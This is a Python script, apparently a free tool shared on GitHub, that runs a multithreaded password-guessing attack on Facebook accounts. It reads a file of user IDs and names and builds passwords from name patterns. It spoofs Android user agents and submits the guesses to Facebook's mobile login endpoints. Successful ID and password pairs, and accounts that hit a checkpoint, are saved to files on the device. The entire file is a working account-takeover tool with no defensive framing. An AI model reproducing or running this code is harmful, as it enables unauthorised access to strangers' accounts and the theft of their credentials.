#SCTIPT OPEN SOURCE BY KRS
#GITHUB : github.com/TEAM-KRS

from os import path
import os,base64,zlib,pip,urllib,time,random,requests
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')

ugen=[]
ugen=[]
useragent=[]
uaku2=[]
ugen2=[]
ugen=[]
aqib_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 9; AFTSO001 Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 9; vivo X21i A Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 11; Moto G6 Plus Build/RQ3A.210705.001)","Dalvik/2.1.0 (Linux; U; Android 12; OPG02 Build/SKQ1.211113.001)","Dalvik/2.1.0 (Linux; U; Android 13; Mi A2 Build/TP1A.220624.021)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002) PB/102","Dalvik/2.1.0 (Linux; U; Android 10; SM-A750FN Build/QP1A.190711.020) PB/102","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ52 Build/61.2.A.0.418)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia X30 5G Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android 10; RAPTOR Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-66-4)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB1.230309.017)","Dalvik/2.1.0 (Linux; U; Android 12; SHG05 Build/SB041)","Dalvik/2.1.0 (Linux; U; Android 10; TIMVISIONBOX Build/QTG1.220427.001)","Dalvik/2.1.0 (Linux; U; Android 13; SO-41B Build/60.3.A.0.444)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; GRUNHELM Build/GX-96MINI)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G715U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; TrekStor SurfTab breeze 9.6 quad 3G Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; MBOX Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 12; ELS-AN00 Build/HUAWEIELS-AN00)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-1-4)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001)","Dalvik/2.1.0 (Linux; U; Android 9; S30_EEA Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; GM1911 Build/SKQ1.211113.001)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; HiDPTAndroid_Hi3751V530 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 13; SO-52B Build/62.2.B.0.416)","Dalvik/2.1.0 (Linux; U; Android 12; V2127 Build/SP1A.210812.003_NONFC)","Dalvik/2.1.0 (Linux; U; Android 13; V2219 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT72 Build/64.1.A.0.891)","Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook R13 (CB5-312T) Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 13; I2202 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; QBELL Android TV Build/RTO5.230306.001)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A705FN Build/RP1A.200720.012) PB/102","Dalvik/2.1.0 (Linux; U; Android 11; moto e30 Build/ROPS31.166-72-5) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-7-3) VD/221","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-27)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) 5G Build/S1RSS32.38-20-9-9)","Dalvik/2.1.0 (Linux; U; Android 11; WALPAD8G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 1.0; IMPulse K1 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9900 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AFTSHN01 Build/PS7636.3472N)","Dalvik/2.1.0 (Linux; U; Android 11; SM-G970U","Dalvik/2.1.0 (Linux; U; Android 13; CPH2413 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13.0; ums512_1h10_Natv Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; AFTTI43 Build/PS7633.3449N)","Dalvik/1.6.0 (Linux; U; Android 4.0.4; SO-03D Build/6.1.F.0.128)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230405.003.G1)","Dalvik/2.1.0 (Linux; U; Android 11; CP20 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 5.1; M-MPB10E Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; XQ-AQ62 Build/58.2.A.10.240)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AC Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 12; S8-KC Build/3.250SI.0359.a)","Dalvik/2.1.0 (Linux; U; Android 13; FP4 Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRPWI Build/PS7328.3432N)","Dalvik/2.1.0 (Linux; U; Android 10; 701SH Build/S2002)","Dalvik/2.1.0 (Linux; U; Android 9; Qilive FHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A405FN Build/RP1A.200720.012) VD/221","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Moto X Play Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A025F Build/SP1A.210812.016) VD/221","Dalvik/2.1.0 (Linux; U; Android 12; 220733SG Build/SP1A.210812.016) VD/221","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 12; SL004T Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Hisense M50 Lite Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 11; moto e30 Build/ROP31.166-76)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.A.0.410)","Dalvik/2.1.0 (Linux; U; Android 13; V2231 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; moto g53 5G Build/T1TP33.75-20)","Dalvik/2.1.0 (Linux; U; Android 10; TE081 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; V2190A Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 11; NE2211 Build/SKQ1.220617.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Vestel_5000_2gb Build/2.32.0)","Dalvik/2.1.0 (Linux; U; Android 11; Doro 8100 Build/S10A_611)","Dalvik/2.1.0 (Linux; U; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) 5G Build/S1RSS32.38-20-7-12)","Dalvik/2.1.0 (Linux; U; Android 13; 2109119DI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Xperia Z3 Build/OPR3.170623.013)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-2-8)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; M26 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; HDT-7435G4 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S292)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A326B Build/SP1A.210812.016) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; 2201117TI Build/RKQ1.211001.001) VD/213","Dalvik/2.1.0 (Linux; U; Android 10; SM-A013M Build/QP1A.190711.020) PB/102","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Vibe K5 Plus Build/OPM7.181205.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TZ797 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6815C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; PGT110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5a Build/TQ2A.230405.003)","Dalvik/2.1.0 (Linux; U; Android 6.0; VK815 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-8)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31 Build/S3RWBS32.125-29-2-5)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T98_box Build/OPM6.171019.030.B1)","Dalvik/2.1.0 (Linux; U; Android 11; MS5424G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; RCT6716Q25 Build/QP1A.190711.020)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; RCS13101T Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 11; SK3404 Build/RQ3A.210705.001)","Dalvik/2.1.0 (Linux; U; Android 5.1; Cynus F7 Build/LMY47D)"])
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU       

logo=("""   
\033[1;35m  **         *******    ******** ******** ******** *******  
\033[1;35m /**        **/////**  **////// /**///// /**///// /**////** 
\033[1;35m /**       **     //**/**       /**      /**      /**   /** 
\033[1;35m /**      /**      /**/*********/******* /******* /*******  
\033[1;35m /**      /**      /**////////**/**////  /**////  /**///**  
\033[1;35m /**      //**     **        /**/**      /**      /**  //** 
\033[1;35m /******** //*******   ******** /********/********/**   //**
////////   ///////   ////////  //////// //////// //     // 
\t\t\t   \033[1;33mMENTAL
\033[1;32m-------------------------------------------
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mLosser 
\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m NOI BATAO GA 
\033[1;36m   \033[1;35mGITHUB       :  \033[1;35m NOI HE
\033[1;32m   \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m   \033[1;35mTEAM         :  \033[1;35mAlone 
\033[1;34m   \033[1;32mTOOL VIRSION :  \033[1;32m0.1
\033[1;32m-------------------------------------------""")

def linex():
        print("\033[1;32m-------------------------------------------")
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
krk=[]
id=[]
tokenku=[]
os.system('git pull')





def KRRSS():
	clear()
	
	print(f"\n \033[1;37m[\033[1;32m1\033[1;37m] FILE CLONEING ")
	#print(f" [\033[1;32m2\033[1;37m] RANDOM CLONE")
	print(f" [\033[1;31m0\033[1;37m] Exit")
	me=input(f'\n\n [\033[1;32m•\033[1;37m] Choice : ')
	
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f'\n [\033[1;32m•\033[1;37m] FILE PATH \033[1;32m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
			exit()
		clear();print(f'\n [\033[1;31m1\033[1;37m] Method \033[1;32m1 \n [\033[1;31m2\033[1;37m] Method \033[1;32m2 ')
		mthd=input(f'\n [\033[1;32m•\033[1;37m] Salect : ')
		plist=[]
		try:
			clear();ps_limit = int(input(f'\n [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add \033[1;33m: '))
		except:
			ps_limit =1
		clear();print(f'\n [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m\n')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m•\033[1;37m] Put password {i+1} :  '))
		clear()
		cx=('y')
		if cx in ['n','N','no','NO','2']:
			krk.append(f'n')
		else:
			krk.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'\n Total Account : \033[1;32m{total_ids} ')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(m2,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(m3,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(m4,ids,names,passlist)
				
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(aqib_ua)
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': aqib_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                        
                        
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;91m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1
                        

def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(aqib_ua)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': aqib_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                                
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;91m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1


KRRSS()
